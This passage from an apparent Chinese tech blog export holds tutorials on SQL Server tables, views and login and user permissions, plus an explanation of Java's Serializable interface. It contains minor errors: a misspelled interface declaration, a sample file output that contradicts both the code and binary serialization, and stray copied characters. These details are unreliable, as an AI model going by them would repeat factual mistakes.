<p>仓库号是一个排序字段，其中 CI(case insensitive)表示不区分大小写，AI(accent insensitive)表示不区分重音，即创建的是一个不区分大小写<br>和不区分重音的排序。如果要区分大小和和区分排序，修改代码为：French_CS_AS</p>
<h3 id="9：动态判断数据库表是否存在"><a href="#9：动态判断数据库表是否存在" class="headerlink" title="9：动态判断数据库表是否存在"></a>9：动态判断数据库表是否存在</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line">if(<span class="keyword">Exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.sysobjects <span class="keyword">where</span> id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;db_table9&#x27;</span>)))</span><br><span class="line">  print <span class="string">&#x27;数据库表名已经存在&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  print <span class="string">&#x27;该数据库表名不存在，可以利用该名创建表&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="10：查看表的各种信息，可以查看指定数据库表的属性、表中字段属性、各种约束等信息"><a href="#10：查看表的各种信息，可以查看指定数据库表的属性、表中字段属性、各种约束等信息" class="headerlink" title="10：查看表的各种信息，可以查看指定数据库表的属性、表中字段属性、各种约束等信息"></a>10：查看表的各种信息，可以查看指定数据库表的属性、表中字段属性、各种约束等信息</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">execute</span> sp_help db_table9;</span><br></pre></td></tr></table></figure>

<h3 id="11：用-select-语句查看数据库表的属性信息"><a href="#11：用-select-语句查看数据库表的属性信息" class="headerlink" title="11：用 select 语句查看数据库表的属性信息"></a>11：用 select 语句查看数据库表的属性信息</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;U&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="12：重命名数据库表"><a href="#12：重命名数据库表" class="headerlink" title="12：重命名数据库表"></a>12：重命名数据库表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">execute</span> sp_rename &quot;db_table9&quot;, &quot;db_renametable&quot;</span><br></pre></td></tr></table></figure>

<h3 id="13：增加数据库表的新字段"><a href="#13：增加数据库表的新字段" class="headerlink" title="13：增加数据库表的新字段"></a>13：增加数据库表的新字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> db_table1 <span class="keyword">add</span> 电子邮件 <span class="type">varchar</span>(<span class="number">50</span>)</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> db_table1 <span class="keyword">add</span> 联系方式 <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">default</span> <span class="string">&#x27;0532-88886396&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name 字段名, xusertype 类型编号, length 长度 <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id <span class="operator">=</span> object_id(<span class="string">&#x27;db_table1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="14：修改数据库表的字段"><a href="#14：修改数据库表的字段" class="headerlink" title="14：修改数据库表的字段"></a>14：修改数据库表的字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> db_table1 <span class="keyword">alter</span> <span class="keyword">column</span> 电子邮件 <span class="type">varchar</span>(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name 字段名, xusertype 类型编号, length 长度 <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id <span class="operator">=</span> object_id(<span class="string">&#x27;db_table1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="15：删除数据库表字段"><a href="#15：删除数据库表字段" class="headerlink" title="15：删除数据库表字段"></a>15：删除数据库表字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> db_table1 <span class="keyword">drop</span> <span class="keyword">column</span> 电子邮件</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name 字段名, xusertype 类型编号, length 长度 <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id <span class="operator">=</span> object_id(<span class="string">&#x27;db_table1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="16：删除数据库表"><a href="#16：删除数据库表" class="headerlink" title="16：删除数据库表"></a>16：删除数据库表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use db_sqlserver;</span><br><span class="line">go</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> db_table1</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> db_table1, db_table2</span><br></pre></td></tr></table></figure>

<p>如果删除有依赖关联的数据库表，即主键、外键关键表、则要删除两个表之间的关联约束，然后才能删除表。注意，也可以先删除引用该表的数据库表，然后即可删除该表，</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL Server创建视图</title>
    <url>/2021/05/15/SQL%20Server%E5%88%9B%E5%BB%BA%E8%A7%86%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="SQL-Server-创建视图"><a href="#SQL-Server-创建视图" class="headerlink" title="SQL Server 创建视图"></a><a href="https://www.w3cschool.cn/sqlserver/sqlserver-xaz328n3.html">SQL Server 创建视图</a></h1><p>从用户角度来看，一个视图是从一个特定的角度来查看数据库中的数据 。</p>
<p>从数据库系统内部来看，一个视图是由 SELECT 语句组成的查询定义的虚拟表（因为一个视图可以拉动多个表，并汇总数据在一起并将其显示，就好像它是一个单一的表）</p>
<p>视图是由一张或多张表中的数据组成的，当你运行视图，会看到它的结果，就像打开一个表时一样。</p>
<p>从数据库系统外部来看，视图就如同<strong>一</strong>张表一样，对表能够进行的一般操作都可以应用于视图，例如查询，插入，修改，删除操作等。</p>
<h2 id="SQL-Server-视图的优点"><a href="#SQL-Server-视图的优点" class="headerlink" title="SQL Server 视图的优点"></a>SQL Server 视图的优点</h2><p>视图可以执行以下操作：</p>
<ul>
<li>限制访问特定的表中的行</li>
<li>限制访问特定的表中的列</li>
<li>从多个表中加入列，并呈现出来，好像他们是一个单一的表的一部分</li>
<li>呈现汇总的信息(如 COUNT 函数的结果)</li>
</ul>
<h2 id="SQL-Server-视图语法"><a href="#SQL-Server-视图语法" class="headerlink" title="SQL Server 视图语法"></a>SQL Server 视图语法</h2><p>通过使用 CREATE VIEW 语句创建一个视图，其次是 SELECT 语句，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> ViewName <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> ...</span><br></pre></td></tr></table></figure>

<h2 id="SQL-Server-创建视图-1"><a href="#SQL-Server-创建视图-1" class="headerlink" title="SQL Server 创建视图"></a>SQL Server 创建视图</h2><p>我们以前使用的查询设计器创建两个表中选择数据的查询。</p>
<p>现在让我们将查询保存为一个名为 “ToDoList” 的视图。</p>
<p>我们需要做的就是把 CREATE VIEW ToDoList 的 AS 查询，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> ToDoList <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span>	Tasks.TaskName, Tasks.Description</span><br><span class="line"><span class="keyword">FROM</span>	Status <span class="keyword">INNER</span> <span class="keyword">JOIN</span></span><br><span class="line">			Tasks <span class="keyword">ON</span> Status.StatusId <span class="operator">=</span> Tasks.StatusId</span><br><span class="line"><span class="keyword">WHERE</span>	(Status.StatusId <span class="operator">=</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="SQL-Server-运行视图"><a href="#SQL-Server-运行视图" class="headerlink" title="SQL Server 运行视图"></a>SQL Server 运行视图</h2><p>创建视图后，就可以简单地查看结果，就像你会选择任何表。</p>
<p>可以简单地键入 select * from todolist，它会运行完整的查询，而不是输入出大量的 SELECT 语句的 INNER JOIN ：</p>
<p><em>注：</em>也可以在视图上单击鼠标右键，并选择 “Select Top 1000 Rows”.</p>
<h2 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h2><p>该视图将返回最新的数据。</p>
<p>如果表中的数据发生变化时，视图的结果会改变过；所以，如果要添加新任务以及状态 “To Do”, 下一次运行来看，这将包括在结果集中的新纪录。</p>
<h2 id="修改视图"><a href="#修改视图" class="headerlink" title="修改视图"></a>修改视图</h2><p>通过使用 ALTER 修改现有的视图，而不是 CREATE。</p>
<p>如果我们想要更改视图就要使用 StatusName 字段，而不是 StatusId，做法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> ToDoList <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span>	Tasks.TaskName, Tasks.Description</span><br><span class="line"><span class="keyword">FROM</span>	Status <span class="keyword">INNER</span> <span class="keyword">JOIN</span></span><br><span class="line">			Tasks <span class="keyword">ON</span> Status.StatusId <span class="operator">=</span> Tasks.StatusId</span><br><span class="line"><span class="keyword">WHERE</span>	(Status.StatusName <span class="operator">=</span> <span class="string">&#x27;To Do&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><em>注：</em>使用查询设计器也可以右键单击视图，然后选择设计来修改您的视图。</p>
<p>正如你所看到的，视图让您保存查询，以便可以做一个 SELECT，再次运行它也会比较简单。</p>
<p>但它们的确有其局限性：它们允许选择数据，但不允许执行任何业务逻辑，如条件语句等。</p>
<p>在下一节中我们通过学习<a href="https://www.w3cschool.cn/sqlserver/sqlserver-hw2328n6.html">存储过程</a>来做到这点。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL Server建立数据库登录账户</title>
    <url>/2021/05/15/SQL%20Server%E5%BB%BA%E7%AB%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%99%BB%E5%BD%95%E8%B4%A6%E6%88%B7/</url>
    <content><![CDATA[<h1 id="参考：SQL-Server-创建登录用户，授权"><a href="#参考：SQL-Server-创建登录用户，授权" class="headerlink" title="参考：SQL Server 创建登录用户，授权"></a>参考：<a href="https://blog.csdn.net/u012997311/article/details/72630321">SQL Server 创建登录用户，授权</a></h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">要成功访问数据库数据，需要两个方面的权限，</span><br><span class="line">（<span class="number">1</span>）连接数据库服务器的权限</span><br><span class="line">（<span class="number">2</span>）需要获得访问某个特定的数据库数据的权限</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建登录账户</span></span><br><span class="line"><span class="keyword">create</span> login u001  <span class="keyword">with</span> password<span class="operator">=</span><span class="string">&#x27;u001&#x27;</span>,default_database<span class="operator">=</span>filmDB<span class="comment">--名称和默认数据库不加引号</span></span><br><span class="line">   <span class="comment">--用存储过程创建</span></span><br><span class="line"> <span class="keyword">exec</span> sp_addlogin <span class="string">&#x27;u002&#x27;</span>,<span class="string">&#x27;u002&#x27;</span></span><br><span class="line"><span class="comment">--登录账户需要关联到数据库用户（多个），默认是一样的名字，</span></span><br><span class="line"><span class="comment">--登录账户只是用来连接服务器，数据库的访问需要数据库用户。</span></span><br><span class="line"><span class="comment">--创建数据库用户</span></span><br><span class="line">  <span class="comment">/***************************************</span></span><br><span class="line"><span class="comment">  *在数据库 filmDB中创建一个数库用户，名字也叫u001</span></span><br><span class="line"><span class="comment">  *并且将登录名u001和数据库用户u001映射，然后再给数据库用户赋予数据操作权限</span></span><br><span class="line"><span class="comment">  *作者：</span></span><br><span class="line"><span class="comment">  *时间：2017年5月15日15:48:54</span></span><br><span class="line"><span class="comment">  ******************************************/</span></span><br><span class="line">  use filmDB</span><br><span class="line">  go</span><br><span class="line">  <span class="keyword">CREATE</span> <span class="keyword">USER</span> u001 <span class="keyword">for</span> login u001  <span class="keyword">with</span> default_schema<span class="operator">=</span>dbo <span class="comment">--default-schema可以不加</span></span><br><span class="line">  go</span><br><span class="line">	 <span class="comment">--用存储过程创建</span></span><br><span class="line">	 <span class="keyword">EXEC</span> sp_grantdbaccess <span class="string">&#x27;u001&#x27;</span>,<span class="string">&#x27;u001&#x27;</span><span class="comment">--前面是登录名后面是数据库用户名</span></span><br><span class="line">  <span class="comment">--为数据库用户设置权限</span></span><br><span class="line">    <span class="keyword">EXEC</span> sp_addrolemember <span class="string">&#x27;db_datareader&#x27;</span>,<span class="string">&#x27;u001&#x27;</span> <span class="comment">--给u001这个用户一个db_datareader角色</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">GRANT</span> <span class="keyword">SELECT</span>,<span class="keyword">INSERT</span>,<span class="keyword">UPDATE</span> <span class="keyword">ON</span> filmInfo <span class="keyword">to</span> u001  <span class="comment">--给filmInfo u001设置权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--禁用u001登录账户</span></span><br><span class="line"><span class="keyword">alter</span> login u001  disable</span><br><span class="line"><span class="comment">--启用u001</span></span><br><span class="line"><span class="keyword">alter</span> login u001  enable</span><br><span class="line"><span class="comment">--登录账号的密码修改</span></span><br><span class="line"><span class="keyword">alter</span> login u001 <span class="keyword">with</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--删除数据库用户</span></span><br><span class="line"><span class="keyword">drop</span>  <span class="keyword">user</span> u001</span><br><span class="line"><span class="comment">--删除登录名</span></span><br><span class="line"><span class="keyword">drop</span> login u001</span><br></pre></td></tr></table></figure>

<h2 id="参考：-建立数据库登录账户"><a href="#参考：-建立数据库登录账户" class="headerlink" title="参考： 建立数据库登录账户"></a>参考： 建立数据库登录账户</h2><ol>
<li>首先在 SQL Server 服务器级 bai 别，创建登 du 陆帐户（create login）</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> login dba <span class="keyword">with</span> password<span class="operator">=</span><span class="string">&#x27;sqlstudy&#x27;</span>, default_database<span class="operator">=</span>mydb</span><br></pre></td></tr></table></figure>

<p>登陆帐户名为：zhi“dba”，登陆密码：“sqlstudy”，默认连接到的数据库 dao：“mydb”。这时候，dba 帐户就可以连接到 SQL Server 服务器上了。但是此时还不能访问数据库中的对象（严格的说，此时 dba 帐户默认是 guest 数据库用户身份，可以访问 guest 能够访问的数据库对象）。<br>要使 dba 帐户能够在 mydb 数据库中访问自己需要的对象，需要在数据库 mydb 中建立一个“数据库用户”，赋予这个“数据库用户” 某些访问权限，并且把登陆帐户“dba” 和这个“数据库用户” 映射起来。习惯上，“数据库用户” 的名字和 “登陆帐户”的名字相同，即：“dba”。创建“数据库用户”和建立映射关系只需要一步即可完成：</p>
<ol start="2">
<li>创建数据库用户（create user）：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> dba <span class="keyword">for</span> login dba <span class="keyword">with</span> default_schema<span class="operator">=</span>dbo</span><br></pre></td></tr></table></figure>

<p>并指定数据库用户“dba” 的默认 schema 是“dbo”。这意味着用户“dba” 在执行“select _ from t”，实际上执行的是 “select _ from dbo.t”。</p>
<ol start="3">
<li>通过加入数据库角色，赋予数据库用户“dba”权限：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exec</span> sp_addrolemember <span class="string">&#x27;db_owner&#x27;</span>, <span class="string">&#x27;dba&#x27;</span></span><br></pre></td></tr></table></figure>

<p>此时，dba 就可以全权管理数据库 mydb 中的对象了。<br>如果想让 SQL Server 登陆帐户“dba”访问多个数据库，比如 mydb2。可以让 sa 执行下面的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use mydb2</span><br><span class="line">go</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> dba <span class="keyword">for</span> login dba <span class="keyword">with</span> default_schema<span class="operator">=</span>dbo</span><br><span class="line">go</span><br><span class="line"><span class="keyword">exec</span> sp_addrolemember <span class="string">&#x27;db_owner&#x27;</span>, <span class="string">&#x27;dba&#x27;</span></span><br><span class="line">go此时，dba 就可以有两个数据库 mydb, mydb2 的管理权限了！</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>禁用、启用登陆帐户：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> login dba disable</span><br><span class="line"><span class="keyword">alter</span> login dba enable</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>登陆帐户改名：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> login dba <span class="keyword">with</span> name<span class="operator">=</span>dba_tom</span><br></pre></td></tr></table></figure>

<p>提示：在 SQL Server 2005 中也可以给 sa 改名。 《SQL Server 2005 安全性增强：给超级用户 sa 改名》</p>
<ol start="6">
<li>登陆帐户改密码：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> login dba <span class="keyword">with</span> password<span class="operator">=</span><span class="string">&#x27;sqlstudy.com&#x27;</span></span><br></pre></td></tr></table></figure>

<ol start="7">
<li>数据库用户改名：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user dba with name=dba_tom</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>更改数据库用户 defult_schema：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user dba with default_schema=sales</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>删除数据库用户：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> dba</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>删除 SQL Server 登陆帐户：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> login dba</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Serializable接口</title>
    <url>/2021/05/15/Serializable%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<h1 id="Serializable-接口"><a href="#Serializable-接口" class="headerlink" title="Serializable 接口"></a>Serializable 接口</h1><p>我们来看看 Serializable 到底是什么，跟进去看一下，我们发现 Serializable 接口里面竟然<strong>什么都没有</strong>，只是个<strong>空接口</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serialzable</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个接口里面什么内容都没有，我们可以将它理解成一个<strong>标识接口</strong>。</p>
<p><strong>比如</strong>在课堂上有位学生遇到一个问题，于是举手向老师请教，这时老师帮他解答，那么这位学生的举手其实就是一个标识，自己解决不了问题请教老师帮忙解决。在 Java 中的这个 Serializable 接口其实是给 jvm 看的，通知 jvm，我不对这个类做序列化了，你(jvm)帮我序列化就好了。</p>
<blockquote>
<p>Serializable 接口就是 Java 提供用来进行高效率的异地共享实例对象的机制，实现这个接口即可。</p>
</blockquote>
<h2 id="什么是-JVM？"><a href="#什么是-JVM？" class="headerlink" title="什么是 JVM？"></a>什么是 JVM？</h2><p>JVM 是 Java Virtual Machine（Java 虚拟机）的缩写，JVM 是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。</p>
<p>一般情况下，我们在定义实体类时会继承 Serializable 接口，类似这样：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String userId;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在实体类中引用了 Serializable 这个接口，那么这个接口到底有什么？细心的你会发现我们还定义了个 serialVersionUID 变量。这个变量到底有什么作用？</p>
<h2 id="什么是-Serializable-接口"><a href="#什么是-Serializable-接口" class="headerlink" title="什么是 Serializable 接口"></a><strong>什么是 Serializable 接口</strong></h2><blockquote>
<p>一个对象序列化的接口，一个类只有实现了 Serializable 接口，它的对象才能被序列化。</p>
</blockquote>
<p>Serializable 是 java.io 包中定义的、用于实现 Java 类的序列化操作而提供的一个语义级别的接口。</p>
<p>Serializable 序列化接口没有任何方法或者字段，只是用于标识可序列化的语义。</p>
<p>实现了 Serializable 接口的类可以被 ObjectOutputStream 转换为字节流，同时也可以通过 ObjectInputStream 再将其解析为对象。</p>
<p>例如，我们可以将序列化对象写入文件后，再次从文件中读取它并反序列化成对象，也就是说，可以使用表示对象及其数据的类型信息和字节在内存中重新创建对象。</p>
<p>而这一点对于面向对象的编程语言来说是非常重要的，因为无论什么编程语言，其底层涉及 IO 操作的部分还是由操作系统其帮其完成的，而底层 IO 操作都是以字节流的方式进行的，所以写操作都涉及将编程语言数据类型转换为字节流，而读操作则又涉及将字节流转化为编程语言类型的特定数据类型。</p>
<p>而 Java 作为一门面向对象的编程语言，对象作为其主要数据的类型载体，为了完成对象数据的读写操作，也就需要一种方式来让 JVM 知道在进行 IO 操作时如何将对象数据转换为字节流，以及如何将字节流数据转换为特定的对象，而 Serializable 接口就承担了这样一个角色。</p>
<h2 id="什么是序列化？"><a href="#什么是序列化？" class="headerlink" title="什么是序列化？"></a>什么是序列化？</h2><p>序列化是指把对象转换为字节序列的过程，我们称之为对象的序列化，就是把内存中的这些对象变成一连串的字节(bytes)描述的过程。</p>
<p>而反序列化则相反，就是把持久化的字节文件数据恢复为对象的过程。</p>
<h2 id="为什么要序列化对象化"><a href="#为什么要序列化对象化" class="headerlink" title="为什么要序列化对象化"></a>为什么要序列化对象化</h2><p>对象的寿命通常随着生成该对象的程序的终止而终止，有时候需要把在内存中的各种对象的状态（也就是实例变量，不是方法）保存下来，并且可以在需要时再将对象恢复。虽然你可以用你自己的各种各样的方法来保存对象的状态，但是 Java 给你提供一种应该比你自己的好的保存对象状态的机制，那就是序列化。</p>
<blockquote>
<p>把对象转换为字节序列的过程称为对象的序列化把字节序列恢复为对象的过程称为对象的反序列</p>
</blockquote>
<h2 id="什么情况下需要序列化？"><a href="#什么情况下需要序列化？" class="headerlink" title="什么情况下需要序列化？"></a>什么情况下需要序列化？</h2><p>大概有这样两类比较常见的场景：</p>
<ol>
<li>想把的内存中的对象状态信息持久化, 例如我们利用 mybatis 框架编写持久层 insert 对象数据到数据库中时 .</li>
<li>想把对象的状态信息通过网络进行传输, 如我们使用 RPC 协议进行网络通信时;</li>
</ol>
<h2 id="如何序列化"><a href="#如何序列化" class="headerlink" title="如何序列化?"></a>如何序列化?</h2><p>那为什么还要继承 Serializable。那是存储对象在存储介质中，以便在下次使用的时候，可以很快捷的重建一个副本。</p>
<p>或许你会问，我在开发过程中，实体并没有实现序列化，但我同样可以将数据保存到 mysql、Oracle 数据库中，为什么非要序列化才能存储呢？</p>
<p>只要一个类实现 Serializable 接口，那么这个类就可以序列化了。</p>
<p>先定义一个序列化对象 User：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String userId;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String userId, String userName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userId = userId;</span><br><span class="line">        <span class="built_in">this</span>.userName = userName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们编写测试类，来对该对象进行读写操作，我们先测试将该对象写入一个文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将User对象作为文本写入磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeObj</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;1001&quot;</span>, <span class="string">&quot;Joe&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/Users/guanliyuan/user.txt&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(user);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        writeObj();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上述代码，我们就将 User 对象及其携带的数据写入了文本 user.txt 中，我们可以看下 user.txt 中存储的数据此时是个什么格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">name:tom    age:<span class="number">22</span></span><br><span class="line">name:tom    age:<span class="number">22</span></span><br></pre></td></tr></table></figure>

<p>我们看到对象数据以二进制文本的方式被持久化到了磁盘文件中。在进行反序列化测试之前，我们可以尝试下将 User 实现 Serializable 接口的代码部分去掉，看看此时写操作是否还能成功，结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.NotSerializableException: cn.wudimanong.serializable.User</span><br><span class="line">    at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:<span class="number">1184</span>)</span><br><span class="line">    at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:<span class="number">348</span>)</span><br><span class="line">    at cn.wudimanong.serializable.SerializableTest.writeObj(SerializableTest.java:<span class="number">19</span>)</span><br><span class="line">    at cn.wudimanong.serializable.SerializableTest.main(SerializableTest.java:<span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<p>结果不出所料，果然是不可以的，抛出了 NotSerializableException 异常，提示非可序列化异常，也就是说没有实现 Serializable 接口的对象是无法通过 IO 操作持久化的。</p>
<p>接下来，我们继续编写测试代码，尝试将之前持久化写入 user.txt 文件的对象数据再次转化为 Java 对象，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将类从文本中提取并赋值给内存中的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">readObj</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/guanliyuan/user.txt&quot;</span>));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">                <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) object;</span><br><span class="line">                System.out.println(user);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 